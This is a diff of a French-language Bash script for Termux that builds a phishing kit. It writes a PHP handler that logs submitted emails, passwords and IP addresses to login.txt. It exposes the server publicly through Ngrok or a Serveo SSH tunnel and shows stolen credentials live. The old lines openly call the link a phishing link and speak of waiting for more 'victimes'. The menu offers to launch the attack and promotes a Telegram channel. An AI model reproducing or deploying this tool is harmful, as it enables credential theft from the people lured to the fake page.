@@ -28,56 +28,58 @@ animation() {
     sleep 1
 }
 
-# Fonction pour afficher les données de connexion (simplifiée pour email/password)
+# Fonction pour afficher les données de connexion (email et password uniquement)
 afficher_donnees() {
-    echo -e "\n${CYAN}\n\n═════════ CONNEXION DÉTECTÉE ═══ ${NC}"
+    echo -e "\n${CYAN}═════════ CONNEXION DÉTECTÉE ═════════${NC}"
     while IFS= read -r ligne || [[ -n "$ligne" ]]; do
         ligne_clean=$(echo "$ligne" | tr -d '\r')
         case "$ligne_clean" in
-            *Email:*|*email:*)
-                echo -e "${VERT}✉️ E-mail: ${NC}${ligne_clean#*: }"
+            *Email:*|*email:*|*Username:*)
+                echo -e "${VERT}✉️ Email: ${NC}${ligne_clean#*: }"
                 ;;
             *password:*|*Password:*|*[Mm]ot\ de\ passe:*)
                 echo -e "${VERT}🔑 Mot de passe: ${NC}${ligne_clean#*: }"
                 ;;
             *IP:*|*ip:*)
-                echo -e "${VERT}🌐 Adresse IP: ${NC}${ligne_clean#*: }"
+                echo -e "${VERT}🌐 IP: ${NC}${ligne_clean#*: }"
                 ;;
         esac
     done < login.txt
-    echo -e "${CYAN}═🚨🚨 Ouvrez une autre page et TAPEZ nano login.txt pour voir les identifiants 🚨${NC}\n"
+    echo -e "${CYAN}══════════════════════════════════════${NC}"
+    echo -e "${ROUGE}🚨 nano login.txt pour voir tous les détails 🚨${NC}\n"
 }
 
-# Fonction pour surveiller et afficher les données PHP en temps réel
+# Fonction pour surveiller les données en temps réel
 surveiller_donnees() {
-    echo -e "${VERT}[•] Surveillance des données PHP en temps réel...${NC}"
-    echo -e "${JAUNE}Appuyez sur ${ROUGE}Ctrl+C${JAUNE} pour arrêter la surveillance${NC}"
+    echo -e "${VERT}[•] Surveillance des connexions en temps réel...${NC}"
+    echo -e "${JAUNE}Appuyez sur ${ROUGE}Ctrl+C${JAUNE} pour arrêter${NC}"
 
     if [ ! -f login.txt ]; then
         touch login.txt
+        chmod 644 login.txt
     fi
 
     if [ -s login.txt ]; then
-        echo -e "${JAUNE}📊 Données actuelles :${NC}"
+        echo -e "${JAUNE}📊 Données existantes :${NC}"
         afficher_donnees
     else
-        echo -e "${JAUNE}🔗 Voici votre lien phishing - copiez-le 👇⚠️👇${NC}"
+        echo -e "${JAUNE}🔗 En attente de premières connexions...${NC}"
     fi
 
     tail -n 0 -f login.txt | while read -r ligne; do
-        if [[ "$ligne" == *"Email:"* || "$ligne" == *"password:"* ]]; then
+        if [[ "$ligne" == *"Email:"* || "$ligne" == *"Password:"* ]]; then
             clear
             animation
-            echo -e "${VERT}[✓] NOUVELLE CONNEXION DÉTECTÉE !${NC}"
+            echo -e "${VERT}[✓] NOUVELLE CONNEXION !${NC}"
             afficher_donnees
-            echo -e "${JAUNE}🕵️ En attente d'autres victimes...${NC}"
+            echo -e "${JAUNE}🕵️ En attente d'autres connexions...${NC}"
         fi
     done
 }
 
-# Fonction pour démarrer le serveur PHP
+# Démarrer le serveur PHP avec le script de récupération
 demarrer_serveur_php() {
-    echo -e "${BLEU}[•] Démarrage du serveur PHP sur le port 8080...${NC}"
+    echo -e "${BLEU}[•] Démarrage du serveur PHP...${NC}"
     
     # Créer le fichier PHP s'il n'existe pas
     if [ ! -f login.php ]; then
@@ -112,12 +114,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             chmod($logFile, 0644);
         }
 
-        if (!is_writable($logFile)) {
-            throw new Exception("Permissions insuffisantes");
-        }
-
         if (file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX) === false) {
-            throw new Exception("Échec de l'écriture");
+            throw new Exception("Échec écriture fichier");
         }
 
         header("Location: mer.html");
@@ -126,7 +124,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     } catch (Exception $e) {
         error_log("Erreur: ".$e->getMessage());
         header("HTTP/1.1 500 Erreur serveur");
-        die("Erreur temporaire. Veuillez réessayer.");
+        die("Erreur temporaire");
     }
 } else {
     header("HTTP/1.1 403 Forbidden");
@@ -138,143 +136,133 @@ EOL
 
     php -S localhost:8080 > /dev/null 2>&1 &
     sleep 2
-    echo -e "${VERT}[✓] Serveur PHP démarré avec succès!${NC}"
-    surveiller_donnees &
+    echo -e "${VERT}[✓] Serveur PHP actif sur port 8080${NC}"
+    surveiller_donnees
 }
 
-# [RESTE DU CODE ORIGINAL INCHANGÉ - fonctions installer_ngrok, generer_lien_ngrok, etc.]
-
-# Fonction pour installer Ngrok
+# Installer Ngrok
 installer_ngrok() {
-    echo -e "${JAUNE}[•] Téléchargement de Ngrok pour ARM64...${NC}"
-    ANIM_PID=$!
-    ngrok_url="https://github.com/inconshreveable/ngrok/releases/download/2.2.8/ngrok-arm64.zip"
+    echo -e "${JAUNE}[•] Téléchargement de Ngrok...${NC}"
     
-    if wget -q -O ngrok.zip "$ngrok_url"; then
+    # Animation
+    while :; do
+        for i in / - \\ \|; do
+            printf "\r${CYAN}Téléchargement... $i ${NC}"
+            sleep 0.1
+        done
+    done & ANIM_PID=$!
+
+    if wget -q -O ngrok.zip "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"; then
         kill $ANIM_PID
-        printf "\r${VERT}[✓] Ngrok téléchargé avec succès.${NC}            \n"
+        echo -e "\r${VERT}[✓] Ngrok téléchargé            ${NC}"
     else
         kill $ANIM_PID
-        echo -e "\r${ROUGE}[!] Échec du téléchargement de Ngrok.${NC}"
+        echo -e "\r${ROUGE}[!] Échec téléchargement${NC}"
         exit 1
     fi
 
-    echo -e "${BLEU}[•] Installation de Ngrok...${NC}"
+    echo -e "${BLEU}[•] Installation...${NC}"
     if unzip -q ngrok.zip; then
         mkdir -p ~/bin/
-        mv ngrok ~/bin/ || { echo -e "${ROUGE}[!] Impossible de déplacer Ngrok"; exit 1; }
-        echo -e "${VERT}[✓] Ngrok installé dans ~/bin/${NC}"
+        mv ngrok ~/bin/ && chmod +x ~/bin/ngrok
         rm ngrok.zip
         export PATH=$PATH:~/bin/
+        echo -e "${VERT}[✓] Ngrok installé dans ~/bin/${NC}"
     else
-        echo -e "${ROUGE}[!] Échec de l'extraction de Ngrok.${NC}"
+        echo -e "${ROUGE}[!] Échec installation${NC}"
         rm ngrok.zip
         exit 1
     fi
 }
 
-# Fonction pour générer un lien avec Ngrok
+# Générer lien Ngrok
 generer_lien_ngrok() {
     if ! command -v ngrok &> /dev/null; then
         installer_ngrok
     fi
     
-    echo -e "${JAUNE}[•] Démarrage de Ngrok (http:8080)...${NC}"
+    echo -e "${JAUNE}[•] Lancement de Ngrok...${NC}"
     echo -e "${CYAN}==================================================${NC}"
     ~/bin/ngrok http 8080 || {
-        echo -e "${ROUGE}[!] Erreur lors du lancement de Ngrok.${NC}"
+        echo -e "${ROUGE}[!] Erreur Ngrok${NC}"
         exit 1
     }
 }
 
-# Fonction pour générer un lien avec Serveo
+# Générer lien Serveo
 generer_lien_serveo() {
-    echo -e "${JAUNE}[•] Connexion à Serveo pour générer un lien public...${NC}"
+    echo -e "${JAUNE}[•] Connexion à Serveo...${NC}"
     echo -e "${CYAN}==================================================${NC}"
-    ssh -R 80:localhost:8080 serveo.net -p 22 || {
-        echo -e "${ROUGE}[!] Échec de la connexion à Serveo.${NC}"
+    ssh -R 80:localhost:8080 serveo.net || {
+        echo -e "${ROUGE}[!] Échec Serveo${NC}"
     }
 }
 
-# Fonction pour générer un lien avec Cloudflared
-generer_lien_autre() {
-    echo -e "${JAUNE}[•] Démarrage avec Cloudflared...${NC}"
-    if ! command -v cloudflared &> /dev/null; then
-        echo -e "${ROUGE}[!] Cloudflared n'est pas installé. Installation...${NC}"
-        pkg install cloudflared -y
-    fi
-    echo -e "${CYAN}==================================================${NC}"
-    cloudflared tunnel --url http://localhost:8080 || {
-        echo -e "${ROUGE}[!] Erreur avec Cloudflared.${NC}"
-        exit 1
-    }
-}
-
-# Vérification des dépendances
+# Vérifier les dépendances
 verifier_dependances() {
-    echo -e "${CYAN}[•] Vérification des dépendances...${NC}"
-    if ! command -v ssh &> /dev/null; then
-        echo -e "${ROUGE}[!] SSH non installé. Installation...${NC}"
-        pkg install openssh -y
-    fi
-
-    if ! command -v php &> /dev/null; then
-        echo -e "${ROUGE}[!] PHP non installé. Installation...${NC}"
-        pkg install php -y
-    fi
-
-    if ! command -v unzip &> /dev/null; then
-        echo -e "${ROUGE}[!] UNZIP non installé. Installation...${NC}"
-        pkg install unzip -y
-    fi
+    echo -e "${CYAN}[•] Vérification des outils...${NC}"
     
-    echo -e "${VERT}[✓] Toutes les dépendances sont satisfaites!${NC}"
+    declare -A outils=(
+        ["php"]="pkg install php -y"
+        ["ssh"]="pkg install openssh -y"
+        ["unzip"]="pkg install unzip -y"
+    )
+    
+    for outil in "${!outils[@]}"; do
+        if ! command -v $outil &> /dev/null; then
+            echo -e "${ROUGE}[!] $outil manquant. Installation...${NC}"
+            eval "${outils[$outil]}" || {
+                echo -e "${ROUGE}[!] Échec installation $outil${NC}"
+                exit 1
+            }
+        fi
+    done
+    
+    echo -e "${VERT}[✓] Tous les outils sont prêts${NC}"
 }
 
 # Menu principal
 menu_principal() {
-    animation
-    echo -e "${VERT}1. ${BLEU}Passer à l'attaque${NC}"
-    echo -e "${VERT}2. ${JAUNE}Rejoindre notre canal Telegram${NC}"
-    echo -e "${VERT}3. ${ROUGE}Quitter${NC}"
-    echo -e "${CYAN}==================================================${NC}"
-    read -p "Choisissez une option (1-3) : " choix
+    while true; do
+        animation
+        echo -e "${VERT}1. ${BLEU}Lancer l'attaque${NC}"
+        echo -e "${VERT}2. ${JAUNE}Notre Telegram${NC}"
+        echo -e "${VERT}3. ${ROUGE}Quitter${NC}"
+        echo -e "${CYAN}==================================================${NC}"
+        read -p "Choix (1-3) : " choix
 
-    case $choix in
-        1)
-            echo -e "${CYAN}Choisissez une méthode de tunneling :${NC}"
-            echo -e "${VERT}1. ${BLEU}Serveo (SSH)${NC}"
-            echo -e "${VERT}2. ${JAUNE}Ngrok (Recommandé)${NC}"
-            echo -e "${VERT}3. ${MAGENTA}Cloudflared${NC}"
-            read -p "Votre choix (1-3) : " methode
+        case $choix in
+            1)
+                echo -e "${CYAN}Méthode de tunneling :${NC}"
+                echo -e "${VERT}1. ${BLEU}Serveo (SSH)${NC}"
+                echo -e "${VERT}2. ${JAUNE}Ngrok${NC}"
+                read -p "Votre choix (1-2) : " methode
 
-            verifier_dependances
-            demarrer_serveur_php
+                verifier_dependances
+                demarrer_serveur_php &
 
-            case $methode in
-                1) generer_lien_serveo ;;
-                2) generer_lien_ngrok ;;
-                3) generer_lien_autre ;;
-                *) echo -e "${ROUGE}Option invalide. Retour au menu...${NC}"; menu_principal ;;
-            esac
-        ;;
-        2)
-            echo -e "${BLEU}Ouverture du canal Telegram HEXTECH ...${NC}"
-            termux-open-url "https://t.me/hextechcar"
-            menu_principal
-        ;;
-        3)
-            echo -e "${ROUGE}Merci d'avoir utilisé notre outil!${NC}"
-            exit 0
-        ;;
-        *)
-            echo -e "${ROUGE}Option invalide. Réessayez.${NC}"
-            sleep 1
-            menu_principal
-        ;;
-    esac
+                case $methode in
+                    1) generer_lien_serveo ;;
+                    2) generer_lien_ngrok ;;
+                    *) echo -e "${ROUGE}Option invalide${NC}"; continue ;;
+                esac
+                ;;
+            2)
+                echo -e "${BLEU}Ouverture Telegram...${NC}"
+                termux-open-url "https://t.me/hextechcar"
+                ;;
+            3)
+                echo -e "${ROUGE}À bientôt!${NC}"
+                exit 0
+                ;;
+            *)
+                echo -e "${ROUGE}Choix invalide${NC}"
+                sleep 1
+                ;;
+        esac
+    done
 }
 
-# Point d'entrée principal
+# Point d'entrée
 clear
-menu_principa
+menu_principal
